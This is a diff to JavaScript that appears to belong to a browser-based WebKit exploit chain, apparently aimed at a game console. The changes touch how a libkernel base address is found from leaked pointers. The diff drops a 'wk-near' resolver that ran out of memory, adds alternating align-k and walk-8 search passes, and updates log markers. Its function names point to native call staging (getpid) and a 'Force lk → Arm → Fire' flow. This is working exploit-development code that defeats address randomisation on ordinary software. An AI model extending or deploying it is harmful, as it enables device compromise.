@@ -49,13 +49,12 @@ import {
     plausibleHeapCell,
     resolveExtAlignedKError,
     resolveMinExtDeepWalk,
-    tryWebkitNearLibkernel,
 } from "./libkernel_resolve.js";
 import { createCrashLog } from "./log_persist.js";
 import { prepNativeChain, stageGetpid, fireGetpid } from "./native_call.js";
 
 const params = new URLSearchParams(location.search);
-const BUILD_ID = "rw-20250831r";
+const BUILD_ID = "rw-20250831s";
 /** opt-in only — release triggers JSC GC */
 const PROMOTE_PAIR = params.get("promote") === "1";
 const SCAN_PIVOT_MIN = 0x10000;
@@ -2017,12 +2016,14 @@ function runVerifyLk() {
     let v = verifyLibkernelBase(p, ptr, off, { webkitBase, off });
     let resolved = null;
     if (!v.ok) {
-        resolved = tryResolveExtVerifyOne(p, off, webkitBase, hex, { minWalkPages: 32 });
+        resolved = tryResolveExtVerifyOne(p, off, webkitBase, hex);
         if (resolved) {
             saveLibkernelSession(resolved.lk, resolved.iatRva);
             if (addrIn) addrIn.value = String(resolved.lk);
-            v = verifyLibkernelBase(p, resolved.lk, off, { fnPtr: ptr, webkitBase, off });
+            v = verifyLibkernelBase(p, resolved.lk, off, { fnPtr: parseAddr(hex), webkitBase, off });
             mark("LK-RESOLVE-OK", hex + " → " + resolved.lk + " via " + resolved.via);
+        } else {
+            mark("LK-RESOLVE-MISS", hex + " pass=" + (extResolveIdx % 2 ? "walk8" : "align-k3"));
         }
     }
     const lkBase = resolved ? resolved.lk : ptr;
@@ -2044,26 +2045,21 @@ function runVerifyLk() {
     crashLog.flushSync();
 }
 
-function tryResolveExtFinishLite(p, off, webkitBase) {
-    if (!p || !webkitBase) return null;
-    return tryWebkitNearLibkernel(p, webkitBase, off);
-}
-
-function tryResolveExtVerifyOne(p, off, webkitBase, hex, opts) {
-    opts = opts || {};
+/** Verify lk only — finish phase does zero reads (wk-near OOMs on HW). */
+function tryResolveExtVerifyOne(p, off, webkitBase, hex) {
     if (!p || !hex) return null;
     const fn = parseAddr(hex);
     if (!fn) return null;
-    if (webkitBase) {
-        const near = tryWebkitNearLibkernel(p, webkitBase, off);
-        if (near) return near;
+    const pass = extResolveIdx % 2;
+    if (pass === 0) {
+        return resolveExtAlignedKError(p, fn, off, webkitBase, {
+            maxKErrors: 3,
+            strongOnly: true,
+            pageAlignOnly: true,
+        });
     }
-    const ak = resolveExtAlignedKError(p, fn, off, webkitBase);
-    if (ak) return ak;
-    if (!opts.noWalk) {
-        const deep = resolveMinExtDeepWalk(p, [hex], off, webkitBase, opts.minWalkPages || 32);
-        if (deep && deep.lk) return deep;
-    }
+    const deep = resolveMinExtDeepWalk(p, [hex], off, webkitBase, 8);
+    if (deep && deep.lk) return deep;
     return null;
 }
 
@@ -2172,22 +2168,9 @@ function finishFindLkChunk(chunk) {
             renderOut();
             crashLog.flushSync();
 
-            const p = window.p;
-            const off = loadEffectiveOff();
-            const { webkitBase } = basesFromSession(off);
-            const near = tryResolveExtFinishLite(p, off, webkitBase);
-            if (near) {
-                saveLibkernelSession(near.lk, near.iatRva);
-                if (addrIn) addrIn.value = String(near.lk);
-                mark("LK-RESOLVE-OK", "wk-near → " + near.lk + " via " + near.via + " build=" + BUILD_ID);
-                state("lk resolved — Force lk → Arm → Fire", "ok");
-                renderOut();
-                crashLog.flushSync();
-                return true;
-            }
             if (addrIn && hexes[0]) addrIn.value = hexes[0];
-            mark("LK-HINT", "Verify lk cycles ext ptrs (1 read path) — or Force lk");
-            mark("LK-MISS", "ext collected — no auto walk (OOM-safe) build=" + BUILD_ID);
+            mark("LK-HINT", "Verify lk cycles ext ptrs — align-k / walk8");
+            mark("LK-MISS", "ext saved — zero finish reads build=" + BUILD_ID);
         } else if (chunk.cells === 0) {
             mark("LK-HINT", "no cells — re-run Start");
         } else if ((chunk.vtCount || 0) === 0) {
